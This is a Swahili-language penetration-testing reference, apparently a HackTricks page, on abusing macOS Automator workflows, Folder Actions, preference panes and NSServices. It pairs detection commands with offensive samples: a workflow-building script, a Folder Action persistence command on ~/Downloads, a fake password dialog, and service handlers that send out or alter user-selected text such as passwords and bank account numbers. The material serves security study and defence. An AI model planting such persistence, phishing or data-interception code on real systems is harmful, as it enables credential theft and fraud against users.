# Matumizi Mabaya ya macOS Automator, Preference Panes na NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions na Workflows

### Taarifa za Msingi

**Automator** ni zana ya macOS ya kufanya automation kwa kutumia muonekano wa picha. Hutekeleza **workflows** (vifurushi vya `.workflow`) vilivyoundwa na **actions** (vifurushi vya `.action`). Automator pia huwezesha **Folder Actions**, **Quick Actions**, na integration ya **Shortcuts**. Kwenye macOS za kisasa, workflows zinaweza pia **kuimportiwa kwenye Shortcuts**, hivyo logic ileile hasidi inaweza kuonekana kama Finder Quick Action, user service chini ya `~/Library/Services/`, au shortcut inayotumia legacy Automator actions.

Automator actions ni **plugins** zinazopakiwa kwenye Automator runtime workflow inapotekelezwa. Zinaweza:
- Kutekeleza shell scripts kiholela
- Kuchakata files na data
- Kuingiliana na applications kupitia AppleScript
- Kuunganishwa kwa mfululizo kwa automation changamano

### Kwa Nini Hili Ni Muhimu

> [!WARNING]
> Automator workflows zinaweza **kushawishiwa kijamii** zitekelezwe — zinaonekana kama document files rahisi. Kifurushi cha `.workflow` kinaweza kuwa na shell commands zilizopachikwa ambazo hutekelezwa workflow inapoendeshwa. Zikiunganishwa na Folder Actions, hutoa **persistence ya kiotomatiki** inayowashwa na file events. Marekebisho ya hivi karibuni ya Gatekeeper pia yalionyesha kuwa **Quick Actions zilizofungwa ndani ya app** (`Contents/PlugIns/*.workflow`) lazima zichukuliwe kama executable content, si data isiyo na madhara.

### Ugunduzi
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Kwa watumiaji wengi, bundle ya `.workflow` huonekana kama faili la kawaida la hati:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions huendesha workflow kiotomatiki faili zinapoongezwa kwenye folder inayofuatiliwa:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions hudumu baada ya kuwasha upya mfumo na hutekelezwa kwa siri. Folder Action kwenye `~/Downloads` inamaanisha **kila faili linalopakuliwa linaanzisha payload yako** — ikijumuisha mafaili kutoka Safari, Chrome, AirDrop, na viambatisho vya barua pepe. Pia kumbuka kwamba `System Events` inaweza kusajili Folder Actions zinazoelekeza kwenye scripts zilizo nje ya maeneo chaguo-msingi ya `~/Library/Scripts/Folder Action Scripts`, jambo linalofanya utafutaji wa loose paths kuwa muhimu. Kwa athari zinazohusiana za TCC, angalia [ukurasa wa TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Maelezo ya Msingi

Preference panes (bundles za `.prefPane`) ni plugins zinazopakiwa na **System Settings** (zamani ziliitwa System Preferences). Hutoa paneli za UI za usanidi kwa vipengele vya mfumo au vya third-party. Kwenye mifumo ya zamani zilipakiwa moja kwa moja na `System Preferences`; kwenye matoleo mapya, panes za third-party kwa kawaida husimamiwa na **legacy loader XPC service** inayoanzishwa kutoka System Settings.

### Kwa Nini Hili Ni Muhimu

- Preference panes hutekelezwa ndani ya **trusted host process** iliyoanzishwa na System Settings / System Preferences
- Kwenye mifumo ya kisasa, host hiyo inaweza kuwa **`legacyLoader` XPC service**, kwa hiyo boundary muhimu bado ni **trusted Apple UI process -> third-party code loading**
- Preference panes za third-party hurithi **host process security context** na trust ya mtumiaji inayohusishwa na UI hiyo
- Watumiaji husakinisha preference panes kwa **kuzibofya mara mbili** — njia rahisi ya social engineering
- Baada ya kusakinishwa, **hudumu** na kupakiwa kila wakati System Settings inapofunguliwa kwenye paneli hiyo

### Ugunduzi
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

A malicious preference pane hurithi **security context ya pane host** (kihistoria `System Preferences`, kwenye versions mpya mara nyingi `legacyLoader` helper inayozinduliwa na `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attack: Persistence kupitia Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

A preference pane can mimic legitimate system UI panels to **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Maelezo ya Msingi

**NSServices** huruhusu applications kutoa functionality kwa apps nyingine kupitia **Services menu** (right-click → Services). Mtumiaji anapochagua text au data na kutumia service, data iliyochaguliwa **hutumwa kwa service provider** kwa ajili ya processing.

Services hutangazwa kwenye `Info.plist` ya application chini ya key ya `NSServices` na kusajiliwa na pasteboard server (`pbs`). macOS pia huhifadhi **service cache** na **restriction policy** zinazoamua ni services zipi zitaonekana na ikiwa callers waliowekwa kwenye sandbox wanapaswa kuonyeshwa warning ya ziada.

### Kwa Nini Hili Ni Muhimu

- Services hupokea **mtiririko wa data kati ya applications** — text iliyochaguliwa kutoka application yoyote hutumwa kwa service
- Service hasidi inaweza kukusanya data kutoka password managers, email clients na financial apps
- Services zinaweza **kurudisha data iliyorekebishwa** kwa application inayoziita (man-in-the-middle kwenye selection operations)
- Majina ya services yanaweza kutengenezwa yaonekane halali ("Format Text", "Encrypt Selection", "Share")
- Flag ya hiari ya `NSRestricted` inahusiana na usalama: service iliyowekwa unrestricted inaweza kuitwa na app iliyo kwenye sandbox bila warning ambayo macOS huonyesha kwa services zinazoweza kusababisha escape<sup>[2]</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attack: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Data Modification (Man-in-the-Middle)

Service inaweza **kubadilisha data inayorejeshwa** huku ikionekana kutoa function halali:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Huduma Zilizowekewa Vizuizi na Matumizi Mabaya ya Kisasa

Apple inasaidia `NSRestricted` boolean ya hiari kwa kila service definition. Ikiwekwa, macOS huwaonya callers walio kwenye sandbox kwa sababu service hiyo inaweza kuwasaidia **kutoka kwenye mipaka ya sandbox au privacy**. Kwa mtazamo wa offensive, hii inatoa njia mbili muhimu za audit:

- Tafuta **third-party services ambazo hazijawekwa alama ya restricted** ingawa zinaproxy Apple Events, file access, au vitendo vingine vya privileged
- Tafuta **built-in services zenye thamani kubwa** zilizo na entitlements thabiti (kwa mfano, services zinazotolewa na Script Editor au helpers zinazotegemea Finder) na kagua kama user interaction pekee inatosha kuzigeuza kuwa primitive ya data-access

Mfano mzuri wa hivi karibuni ni **CVE-2022-48574**, ambapo Services mechanism ingeweza kutumiwa vibaya kufikia **faili za mtumiaji zinazolindwa na TCC bila confirmation flow iliyotarajiwa**. Bug hiyo imerekebishwa, lakini technique bado ni muhimu kwa threat modeling: service yoyote inayoforward file access au automation requests kwa niaba ya caller inastahili kuchunguzwa kwa kiwango hicho hicho.<sup>[2]</sup>

---

## Maelezo ya Hivi Karibuni ya Usalama

- **Quick Actions ni executable content**: Apple ilirekebisha Gatekeeper bypass mwaka wa 2024 ambapo Automator Quick Action iliyowekwa ndani ya app ingeweza kuendeshwa bila assessment ya kawaida. Unapofanya audit ya apps, kagua `Contents/PlugIns/*.workflow/Contents/document.wflow` kama vile ungekagua helper scripts au login items. Tazama [ukurasa wa Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[1]</sup>
- **Shortcuts zinaweza kurithi tabia ya legacy Automator**: Apple pia iliongeza user-consent prompt baada ya third-party shortcuts kugunduliwa zikitumia **legacy Automator action** kutuma Apple Events bila permission flow iliyotarajiwa. Imported workflows na shortcut bundles zinapaswa kukaguliwa kwa `Run AppleScript`, `Run Shell Script`, na bridge actions zinazofanana. Tazama [ukurasa wa TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator bado ni privacy boundary inayotumika**: Apple ilitoa marekebisho mengine ya Automator mwaka wa 2025 kwa ajili ya access kwenye protected user data. Hata kama Automator ni legacy surface, chukulia workflow runner, Quick Action host, au automation bridge yoyote kama attack surface ya sasa badala ya dead code.

---

## Attack Chains za Mbinu Tofauti

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Wizi wa Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Marejeo

- [1] [Apple — Kuhusu maudhui ya usalama ya macOS Ventura 13.7, Sonoma 14.7, na Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Jinsi exploit ya NSServices ilivyofanya kazi kwenye macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
